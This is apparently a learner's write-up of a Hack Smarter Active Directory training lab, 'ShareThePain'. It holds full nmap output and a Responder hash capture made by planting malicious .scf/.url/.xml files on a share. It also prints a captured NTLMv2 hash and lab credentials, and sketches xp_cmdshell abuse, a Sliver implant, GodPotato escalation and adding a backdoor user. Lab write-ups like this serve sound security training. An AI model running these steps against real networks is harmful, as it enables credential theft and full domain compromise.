---
description: AD Challenge Lab (Medium) - by Ryan Yager
---

# Share the Pain (Medium)

**From Hack Smarter labs:**

"ShareThePain" is a medium-rated Active Directory lab. It is a more challenging lab than "BuildingMagic" and is more aligned with the difficulty of certifications such as the **Practical Network Penetration Tester (PNPT)** or the **Hack The Box Certified Penetration Testing Specialist (CPTS)**. This lab focuses on a series of steps to achieve full domain compromise.

* **Initial Enumeration:** Reconnaissance to discover network services, hosts, and potential vulnerabilities.
* **Active Directory Enumeration:** Techniques to gather information on users, groups, computers, and other objects within the Active Directory domain. This helps map out the network and find potential attack paths.
* **Pivoting & Port Forwarding:** Techniques used to access a network segment that is not directly reachable from the attacker's machine. This involves using a compromised host as a "pivot point" to route traffic to internal services.
* **SOCKS Proxy:** Setting up a SOCKS proxy to route network traffic through the compromised host, allowing the attacker to interact with the internal network as if they were on it. This is a common method for creating a secure channel for pivoting.
* **Privilege Escalation:** Abusing common misconfigurations and vulnerabilities, specifically within a database, to gain higher-level permissions on the compromised host or the domain.



**Objective:** You're a **penetration tester** on the **Hack Smarter Red Team**. Your mission is to infiltrate and seize control of the client's entire Active Directory environment. This isn't just a test; it's a full-scale assault to expose and exploit every vulnerability.

**Initial Access:** For this engagement, you've been granted **direct network access** to the client's network. The door is open, but you're starting with **zero credentials**. From here, every move counts.

**Execution:** Your objective is simple but demanding: **enumerate, exploit, and own.** Your ultimate goal is not just to get in, but to achieve a **full compromise**, elevating your privileges until you hold the keys to the entire domain.



Lab Notes when I went through it:

rustscan -a ip addr — -A

```jsx
┌──(root㉿kali)-[~/Deskt
op/ShareThePain]
└─# rustscan -a 10.1.217.237 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   }{ {_  /  ___} / {} \\ |  | | | .-. \\\\\\\\| {_} |.-._} } | |  .-._} }\\\\\\\\     }/  /\\\\\\\\  \\\\\\\\| |\\\\\\\\  | -' -'-----'----'  -'  ----'  ---' -'  -'-' -'
The Modern Day Port Scanner.

: <http://discord.skerritt.blog> :
: <https://github.com/RustScan/RustScan> :
🌍HACK THE PLANET🌍
[~] The config file is expected to be at "/root/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.1.217.237:53
Open 10.1.217.237:88
Open 10.1.217.237:139
Open 10.1.217.237:135
Open 10.1.217.237:389
Open 10.1.217.237:445
Open 10.1.217.237:464
Open 10.1.217.237:593
Open 10.1.217.237:636
Open 10.1.217.237:3389
Open 10.1.217.237:5985
Open 10.1.217.237:47001
Open 10.1.217.237:49671
Open 10.1.217.237:49667
Open 10.1.217.237:49665
Open 10.1.217.237:49666
Open 10.1.217.237:49664
Open 10.1.217.237:49672
Open 10.1.217.237:49675
Open 10.1.217.237:49676
Open 10.1.217.237:49679
Open 10.1.217.237:49708
Open 10.1.217.237:49714
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -A" on ip 10.1.217.237
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.95 ( <https://nmap.org> ) at 2025-12-09 10:32 EST
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:32
Completed NSE at 10:32, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:32
Completed NSE at 10:32, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:32
Completed NSE at 10:32, 0.00s elapsed
Initiating Ping Scan at 10:32
Scanning 10.1.217.237 [4 ports]
Completed Ping Scan at 10:32, 0.06s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 10:32
Scanning hack.smarter (10.1.217.237) [23 ports]
Discovered open port 53/tcp on 10.1.217.237
Discovered open port 135/tcp on 10.1.217.237
Discovered open port 445/tcp on 10.1.217.237
Discovered open port 464/tcp on 10.1.217.237
Discovered open port 3389/tcp on 10.1.217.237
Discovered open port 49671/tcp on 10.1.217.237
Discovered open port 139/tcp on 10.1.217.237
Discovered open port 49672/tcp on 10.1.217.237
Discovered open port 49708/tcp on 10.1.217.237
Discovered open port 49676/tcp on 10.1.217.237
Discovered open port 49675/tcp on 10.1.217.237
Discovered open port 49664/tcp on 10.1.217.237
Discovered open port 49665/tcp on 10.1.217.237
Discovered open port 49667/tcp on 10.1.217.237
Discovered open port 636/tcp on 10.1.217.237
Discovered open port 49666/tcp on 10.1.217.237
Discovered open port 49679/tcp on 10.1.217.237
Discovered open port 49714/tcp on 10.1.217.237
Discovered open port 389/tcp on 10.1.217.237
Discovered open port 5985/tcp on 10.1.217.237
Discovered open port 593/tcp on 10.1.217.237
Discovered open port 47001/tcp on 10.1.217.237
Discovered open port 88/tcp on 10.1.217.237
Completed SYN Stealth Scan at 10:32, 0.11s elapsed (23 total ports)
Initiating Service scan at 10:32
Scanning 23 services on hack.smarter (10.1.217.237)
Service scan Timing: About 60.87% done; ETC: 10:34 (0:00:35 remaining)
Completed Service scan at 10:33, 54.40s elapsed (23 services on 1 host)
Initiating OS detection (try #1) against hack.smarter (10.1.217.237)
Retrying OS detection (try #2) against hack.smarter (10.1.217.237)
Initiating Traceroute at 10:33
Completed Traceroute at 10:33, 3.02s elapsed
Initiating Parallel DNS resolution of 1 host. at 10:33
Completed Parallel DNS resolution of 1 host. at 10:33, 0.02s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 3, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
NSE: Script scanning 10.1.217.237.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:33
Completed NSE at 10:33, 8.66s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:33
Completed NSE at 10:33, 0.84s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:33
Completed NSE at 10:33, 0.00s elapsed
Nmap scan report for hack.smarter (10.1.217.237)
Host is up, received echo-reply ttl 126 (0.046s latency).
Scanned at 2025-12-09 10:32:46 EST for 70s
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2025-12-09 15:32:46Z)
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: hack.smarter0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 126
464/tcp   open  kpasswd5?     syn-ack ttl 126
593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 126
3389/tcp  open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC01.hack.smarter
| Issuer: commonName=DC01.hack.smarter
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-09-05T03:46:00
| Not valid after:  2026-03-07T03:46:00
| MD5:   4b40:6c01:63f1:81e4:4f56:64b7:8ef3:4bbc
| SHA-1: 2ad1:c7dc:ab46:ae72:570a:ea85:2192:51cf:1707:3692
| -----BEGIN CERTIFICATE-----
| MIIC5jCCAc6gAwIBAgIQL7/TDfsBKaJEuIxvqLtNeDANBgkqhkiG9w0BAQsFADAc
| MRowGAYDVQQDExFEQzAxLmhhY2suc21hcnRlcjAeFw0yNTA5MDUwMzQ2MDBaFw0y
| NjAzMDcwMzQ2MDBaMBwxGjAYBgNVBAMTEURDMDEuaGFjay5zbWFydGVyMIIBIjAN
| BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAr/z97jkoYVuqCfcPuR2gCVRNgSK+
| MB7v2Nxa64USo34Z8OzT758ox5d7FFrmZSm3A0bvUNtVYjw4qAekjAYNCSCZO1JI
| GVDjieej7jRyApmXOCnV82Pp0pDZuc/v8hg1X1JNeXlI4vgi4cVXIQk2Cg6ljjap
| DRcm2JARZ8gNFvn/VbDTBpipp2nFIENtCM0wwslxI4SGbx8+GisHqOwt0tbelpuL
| JQ+uQPoddL45Fz7uQ/Pp/5nnqmtR/6yAR2jFir3v5/hZ7zycPCTlAocRth6azFW2
| UTke69SByvN+BJdgP2QbyXWcJHwX0GatenQCzht4ZCq0O2CsX9+7+lPKbQIDAQAB
| oyQwIjATBgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcN
| AQELBQADggEBAAVQZIet+fvKcDwhSGcITFyO7RHjL51Q0aauioSdlow50XVGZ8vW
| ptOhb5GwWmGfo8abmKZO8mqK/SkaNU6pA7zwvBHVUqwWF2bMKyWKMBLOB0VIQaxT
| ZfV0LL8KR3oCs1fuC60rxDF8JIEne9vgL5z+dmgxXd6SZJf1//ZPjmUf7ai3ohtg
| MRq87WZuf2P7m2rZaPcIcyMDM0Zt5MSGr+bD9V2AboDrKh6TYrz4ODkNPUbeGyT/
| q57XlN2ERF6OYCYAGpLdCDxHmAhQhihKbxtnC4vwhUCaXnDUSD2v+9WYbrFmWMNl
| UCJT2ircDq6fnW4O9KJJhg5udslgzhQcT3Y=
|-----END CERTIFICATE-----
| rdp-ntlm-info:
|   Target_Name: HACK
|   NetBIOS_Domain_Name: HACK
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: hack.smarter
|   DNS_Computer_Name: DC01.hack.smarter
|   DNS_Tree_Name: hack.smarter
|   Product_Version: 10.0.20348
|  System_Time: 2025-12-09T15:33:42+00:00
|_ssl-date: 2025-12-09T15:33:50+00:00; -6s from scanner time.
5985/tcp  open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49672/tcp open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49676/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49679/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49708/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49714/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows Server 2016 (94%), Microsoft Windows Server 2022 (93%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows 10 1607 (90%), Microsoft Windows Server 2019 (89%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 or Windows 8.1 (89%), Microsoft Windows 10 1703 or Windows 11 21H2 (89%), Microsoft Windows Server 2016 or Server 2019 (89%), Microsoft Windows Server 2012 (88%), Microsoft Windows 10 1703 (87%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.95%E=4%D=12/9%OT=53%CT=%CU=40686%PV=Y%DS=3%DC=T%G=N%TM=69384164%P=x86_64-pc-linux-gnu)
SEQ(SP=103%GCD=1%ISR=10B%TI=I%CI=I%TS=A)
SEQ(SP=107%GCD=1%ISR=107%TI=I%CI=I%TS=A)
OPS(O1=M578NW8ST11%O2=M578NW8ST11%O3=M578NW8NNT11%O4=M578NW8ST11%O5=M578NW8ST11%O6=M578ST11)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFDC)
ECN(R=Y%DF=Y%T=80%W=FFFF%O=M578NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=N)
Uptime guess: 0.002 days (since Tue Dec  9 10:30:26 2025)
Network Distance: 3 hops
TCP Sequence Prediction: Difficulty=263 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 54851/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 33839/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 65495/udp): CLEAN (Timeout)
|   Check 4 (port 57336/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|clock-skew: mean: -6s, deviation: 0s, median: -6s
| smb2-security-mode:
|   3:1:1:
|    Message signing enabled and required
| smb2-time:
|   date: 2025-12-09T15:33:46
|_  start_date: N/A
TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
1   49.88 ms 10.200.0.1
2   ...
3   52.54 ms hack.smarter (10.1.217.237)
NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:33
Completed NSE at 10:33, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:33
Completed NSE at 10:33, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:33
Completed NSE at 10:33, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
Nmap done: 1 IP address (1 host up) scanned in 71.17 seconds
Raw packets sent: 95 (6.496KB) | Rcvd: 59 (3.680KB)
```

SMBCLIENT

┌──(root㉿kali)-\[\~/Desktop/ShareThePain] └─# smbclient -L [//192.1.217.237](https://192.1.217.237/)

do\_connect: Connection to 192.1.217.237 failed (Error NT\_STATUS\_IO\_TIMEOUT)

┌──(root㉿kali)-\[\~/Desktop/ShareThePain] └─# smbclient -L [//hack.smarter](https://hack.smarter/) Password for \[WORKGROUP\root]:

```
    Sharename       Type      Comment
    ---------       ----      -------
    ADMIN$          Disk      Remote Admin
    C$              Disk      Default share
    IPC$            IPC       Remote IPC
    NETLOGON        Disk      Logon server share
    Share           Disk
    SYSVOL          Disk      Logon server share

```

Reconnecting with SMB1 for workgroup listing. do\_connect: Connection to hack.smarter failed (Error NT\_STATUS\_RESOURCE\_NAME\_NOT\_FOUND) Unable to connect with SMB1 -- no workgroup available

┌──(root㉿kali)-\[\~/Desktop/ShareThePain] └─# smbclient -L [//hack.smarter/share](https://hack.smarter/share) Password for \[WORKGROUP\root]:

```
    Sharename       Type      Comment
    ---------       ----      -------
    ADMIN$          Disk      Remote Admin
    C$              Disk      Default share
    IPC$            IPC       Remote IPC
    NETLOGON        Disk      Logon server share
    Share           Disk
    SYSVOL          Disk      Logon server share

```

Reconnecting with SMB1 for workgroup listing. do\_connect: Connection to hack.smarter failed (Error NT\_STATUS\_RESOURCE\_NAME\_NOT\_FOUND) Unable to connect with SMB1 -- no workgroup available

┌──(root㉿kali)-\[\~/Desktop/ShareThePain]

touch hacksmarter.txt

smbclient [//hack.smarter/share](https://hack.smarter/share)

put hacksmarter.txt

can put files with [smbkiller.py](http://smbkiller.py)

[smbkiller.py](http://smbkiller.py) -r Host -l listening -d domain -i tun0 -a share -U user -P pass -A

h

```mermaid
└─# python3 SMB_Killer.py  -r 10.1.217.237 -l 10.200.18.222 -d hack.smarter -i tun0 -a share -A
/root/Desktop/ShareThePain/SMB_Killer/SMB_Killer.py:23: SyntaxWarning: invalid escape sequence '\\/'
  print(YELLOW+ "|  _  |  __ \\/  __ \\   /  ___|  \\/  || ___ \\   | | / /_   _| |    | |    |  ___| ___ \\\\")
/root/Desktop/ShareThePain/SMB_Killer/SMB_Killer.py:24: SyntaxWarning: invalid escape sequence '\\/'
  print(GREEN+  "| | | | |  \\/| /  \\/   \\ `--.| .  . || |_/ /   | |/ /  | | | |    | |    | |__ | |_/ /")
/root/Desktop/ShareThePain/SMB_Killer/SMB_Killer.py:25: SyntaxWarning: invalid escape sequence '\\ '
  print(MAGENTA+"| | | | | __ | |        `--. \\ |\\/| || ___ \\   |    \\  | | | |    | |    |  __||    / ")
/root/Desktop/ShareThePain/SMB_Killer/SMB_Killer.py:26: SyntaxWarning: invalid escape sequence '\\ '
  print(BLUE+   "\\ \\_/ / |_\\ \\| \\__/\\   /\\__/ / |  | || |_/ /   | |\\  \\_| |_| |____| |____| |___| |\\ \\ ")
/root/Desktop/ShareThePain/SMB_Killer/SMB_Killer.py:27: SyntaxWarning: invalid escape sequence '\\_'
  print(RED+    " \\___/ \\____/ \\____/   \\____/\\_|  |_/\\____/    \\_| \\_/\\___/\\_____/\\_____/\\____/\\_| \\_|")
 _____ _____  _____     ________  _________     _   _______ _      _      ___________ 
|  _  |  __ \\/  __ \\   /  ___|  \\/  || ___ \\   | | / /_   _| |    | |    |  ___| ___ \\                                                                                                                                                      
| | | | |  \\/| /  \\/   \\ `--.| .  . || |_/ /   | |/ /  | | | |    | |    | |__ | |_/ /                                                                                                                                                      
| | | | | __ | |        `--. \\ |\\/| || ___ \\   |    \\  | | | |    | |    |  __||    /                                                                                                                                                       
\\ \\_/ / |_\\ \\| \\__/\\   /\\__/ / |  | || |_/ /   | |\\  \\_| |_| |____| |____| |___| |\\ \\                                                                                                                                                       
 \\___/ \\____/ \\____/   \\____/\\_|  |_/\\____/    \\_| \\_/\\___/\\_____/\\_____/\\____/\\_| \\_|                                                                                                                                                      
                                                                                                                                                                                                                                            
Making @evil.xml 
                                                                                                                                                                                                                                            
Putting file into smb server, once done exit out of SMB Server and responder will automatically start 
                                                                                                                                                                                                                                            
Making @evil.url 
                                                                                                                                                                                                                                            
Putting file into smb server, responder will automatically start 
                                                                                                                                                                                                                                            
Making @evil.scf 
                                                                                                                                                                                                                                            
Putting file into smb server and starting Responder 
                                                                                                                                                                                                                                            
Password for [WORKGROUP\\root]:
putting file @evil.xml as \\@evil.xml (1.3 kB/s) (average 1.3 kB/s)
putting file @evil.url as \\@evil.url (0.8 kB/s) (average 1.1 kB/s)
putting file @evil.scf as \\@evil.scf (0.7 kB/s) (average 0.9 kB/s)
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.200.18.222]
    Responder IPv6             [fe80::8349:defd:7fc9:373]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-BM1M1FZS0TY]
    Responder Domain Name      [Q7ZY.LOCAL]
    Responder DCE-RPC Port     [46467]

[*] Version: Responder 3.1.7.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>
[*] To sponsor Responder: <https://paypal.me/PythonResponder>

[+] Listening for events...                                                                                                                                                                                                                 

[SMB] NTLMv2-SSP Client   : 10.1.217.237
[SMB] NTLMv2-SSP Username : HACK\\bob.ross
[SMB] NTLMv2-SSP Hash     : bob.ross::HACK:30d5832bc5d684d9:DE87B6290495DCE5E08D68DFA50806AF:01010000000000008000010BFA68DC010F3465BC3A650D0A0000000002000800510037005A00590001001E00570049004E002D0042004D0031004D00310046005A00530030005400590004003400570049004E002D0042004D0031004D00310046005A0053003000540059002E00510037005A0059002E004C004F00430041004C0003001400510037005A0059002E004C004F00430041004C0005001400510037005A0059002E004C004F00430041004C00070008008000010BFA68DC0106000400020000000800300030000000000000000100000000200000099B4277ECD70D63F226B695ACC0C1108AC9840F443A5963199F90A889AEDA700A001000000000000000000000000000000000000900240063006900660073002F00310030002E003200300030002E00310038002E003200320032000000000000000000  
```

nxc ldap \<domain controller> -u username -p password —bloodhound —collection All — dns-server \<target IP address>

[ad-bloodhound.sh](http://ad-bloodhound.sh)

netstat shows ups what is avaliable

netstat -ano | findstr LISTENING

go out to C dir and do a force dir -force, for priv esc

use sliver with mssql

sudo systemcl start sliver

sliver

mtl -L listening host -l port 443

set up proxychains4

proxychains -q impacket-mssqlclient ‘hack.smarter’/’alice.wonderland’:’Password123’@127.0.0.1 - windows-auth

SQL EXEC xp\_cmdshell’,1;

reconfigure

xp\_cmdshell whoami

xp\_cmdshell ‘CL/Temp/pivot.exe’ this will run the pivot.exe that we uploaded earlier for the listening sliver session

then upload GodPotato.exe to get SQLSERVICE user which can lead to further compromise.

for potato sessions:

./GodPotato.exe -cmd ‘cmd /c whoami’

./GodPotato.exe -cmd ‘net user hacksmarter hacksmart1!!! /add’

Hacksmarter:HackSmart1!!!

add user to admins group

look for impersonate privileges or any other way to escalate privileges.

